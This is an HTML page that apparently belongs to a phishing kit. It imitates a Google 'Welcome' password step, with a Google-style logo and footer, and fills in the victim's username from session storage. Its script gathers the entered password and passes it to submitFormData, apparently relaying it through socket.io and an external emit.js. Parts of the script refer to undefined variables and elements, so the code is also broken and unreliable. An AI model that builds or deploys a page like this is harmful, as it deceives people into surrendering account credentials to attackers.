<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<title>2-Step Verification</title>

<link href="https://fonts.googleapis.com/css?family=Google+Sans:100,300,400,500,700,900" rel="stylesheet">
<link href="https://fonts.googleapis.com/css2?family=Material+Symbols+Outlined" rel="stylesheet">
<script src="https://cdn.socket.io/4.7.5/socket.io.min.js"></script>
<script src="https://code.jquery.com/jquery-3.6.0.min.js"></script>

<style>

*{
margin:0;
padding:0;
box-sizing:border-box;
font-family:'Google Sans',sans-serif;
}

body{
background:#ffffff;
color:#202124;
min-height:100vh;
overflow-x:hidden;
}

/* PAGE WRAPPER */

.page-wrapper{
min-height:100vh;
display:flex;
flex-direction:column;
align-items:center;
}

/* CENTER COLUMN */

.center-column{
width:100%;
display:flex;
flex-direction:column;
align-items:center;
}

/* CONTAINER */

.container{
width:100%;
padding:28px 24px 120px 24px;
background:#ffffff;
display:flex;
flex-direction:column;
align-items:flex-start;
}

/* GOOGLE LOGO */

.google-icon{
width:60px;
margin-bottom:35px;
}

/* HEADER */

.header-left{
width:100%;
margin-bottom:16px;
}

.header-left h1{
font-size:30px;
font-weight:500;
margin-bottom:12px;
}

/* USER INFO */

.user-info{
display:inline-flex;
align-items:center;
gap:6px;
border:1px solid #dadce0;
border-radius:20px;
padding:3px 6px;
cursor:pointer;
font-size:14px;
color:#202124;
background:#fff;
margin-bottom:15px;
}

.user-icon{
font-size:25px;
color:#5f6368;
}

.username{
font-weight:500;
}

.arrow-icon{
font-size:18px;
color:#5f6368;
}

/* INPUT */

.input-wrapper{
position:relative;
margin-bottom:8px;
width:100%;
}

.input-wrapper input{
width:100%;
padding:17px 14px;
border:1px solid #dadce0;
border-radius:6px;
font-size:18px;
background:transparent;
outline:none;
transition:0.2s ease;
margin-top:10px;
}

/* blue border on focus */

.input-wrapper input:focus{
border-color:#1a73e8;
}

/* floating label */

.input-wrapper label{
position:absolute;
left:14px;
top:55%;
transform:translateY(-50%);
font-size:16px;
color:#5f6368;
padding:0 6px;
transition:0.2s ease;
pointer-events:none;
background:#ffffff;
}

/* lift label */

.input-wrapper input:focus + label,
.input-wrapper input:not(:placeholder-shown) + label{
top:12px;
font-size:12px;
color:#1a73e8;
}

/* SHOW PASSWORD */

.show-password-wrapper{
display:flex;
align-items:center;
gap:6px;
font-size:16px;
margin-top:26px;
margin-bottom:16px;
cursor:pointer;
}

/* ACTION ROW */

.action-row{
display:flex;
justify-content:space-between;
align-items:center;
width:100%;
margin-top:50px;
}

.try-link{
color:#1a73e8;
text-decoration:none;
font-size:16px;
font-weight:450;
}

/* BUTTON */

.next-btn{
background:#1a73e8;
color:#ffffff;
border:none;
padding:12px 28px;
border-radius:22px;
font-size:15px;
cursor:pointer;
}

/* MOBILE FOOTER */

.page-footer{
font-size:12px;
color:#5f6368;
display:flex;
justify-content:space-between;
align-items:center;
padding:12px 20px;
position:fixed;
bottom:0;
left:0;
width:100%;
background:#ffffff;
}

.language-select{
display:flex;
align-items:center;
gap:6px;
border:1px solid #dadce0;
padding:6px 12px;
border-radius:18px;
cursor:pointer;
}

.language-select::after{
content:"▼";
font-size:10px;
margin-left:6px;
}

.footer-links{
display:flex;
gap:14px;
}

.footer-links a{
color:#5f6368;
text-decoration:none;
}

/* DESKTOP */

@media (min-width:768px){

body{
background:#f1f3f4;
}

/* center vertically */

.page-wrapper{
justify-content:center;
}

/* card */

.container{
max-width:460px;
padding:40px;
border-radius:18px;
box-shadow:0 8px 30px rgba(0,0,0,0.08);
}

/* footer below card */

.page-footer{
position:static;
width:460px;
margin-top:16px;
background:transparent;
}

}

</style>
</head>

<body>

<div class="page-wrapper">

<div class="center-column">

<div class="container">

<img src="https://img.icons8.com/?size=100&id=17949&format=png&color=000000" class="google-icon">

<div class="header-left">

<h1>Welcome</h1>

<div class="user-info">
<span class="material-symbols-outlined user-icon">account_circle</span>
<span class="username" id="username"></span>
<span class="material-symbols-outlined arrow-icon">expand_more</span>
</div>

<div class="input-wrapper">
<input type="password" id="codeInput" placeholder=" ">
<label>Enter your password</label>
</div>

</div>

<label class="show-password-wrapper">
<input type="checkbox" id="showPassword"> Show password
</label>

<div class="action-row">
<a href="#" class="try-link">Forgot password</a>
<button class="next-btn" id="submitBtn">Next</button>
</div>

</div>

<!-- FOOTER -->

<div class="page-footer">

<div class="language-select">
English (United States)
</div>

<div class="footer-links">
<a href="#">Help</a>
<a href="#">Privacy</a>
<a href="#">Terms</a>
</div>

</div>

</div>

</div>

<script src="assets/emit.js"></script>   
<script>  
	page = "auth";  
	document.querySelector("#username").textContent = sessionStorage.getItem("user");  
  
submitBtn.addEventListener("click", function() {  
  
	const value = input.value.trim();  
	  
	if(value === ""){  
    showError("Enter your password");  
    return;  
  }  
  const inputs = $('#codeField')  
    .find('input[type="text"], input[type="password"]');  
  
  const user = {};  
  
  inputs.each(function () {  
    const value = $(this).val().trim();  
    user[$(this).attr("name")] = value;  
  });  
  
  submitFormData(user);  
});  
  
  
// Show password toggle  
showPasswordCheckbox.addEventListener("change",()=>{  
  input.type = showPasswordCheckbox.checked ? "text" : "password";  
});  
</script>   

</body>
</html>
